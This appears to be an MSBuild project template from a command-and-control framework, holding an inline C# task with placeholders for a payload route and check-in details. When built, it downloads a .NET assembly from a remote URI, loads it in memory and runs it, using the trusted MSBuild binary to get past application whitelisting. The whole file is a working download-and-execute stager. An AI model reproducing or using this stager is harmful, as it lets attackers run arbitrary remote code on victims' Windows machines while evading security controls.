<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="ExecutingIT">
   <ExecuteThings/>
  </Target>
   <UsingTask
    TaskName="ExecuteThings"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

    using System;
    using System.IO;
    using System.Net;
    using System.Reflection;

    class Program
    {
        private static byte[] Get(string uri)
        {
            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(uri);
            myRequest.Method = "GET";
            WebResponse response = myRequest.GetResponse();
            MemoryStream memoryStream = new MemoryStream();
            response.GetResponseStream().CopyTo(memoryStream);
            return memoryStream.ToArray();
        }

        public static void Main(string[] args)
        {
            byte[] asmb_bytes = Get("{{ csharp_route }}");
            var asmb = Assembly.Load(asmb_bytes);
            asmb.EntryPoint.Invoke(null, new object[] { args });
        }
    }

    public class ExecuteThings : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask
    {
        public override bool Execute()
        {
            Program.Main(new string[] {"{{ check_in_uri }}", "{{ check_in_job_id }}"});
            return true;
        }
    }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>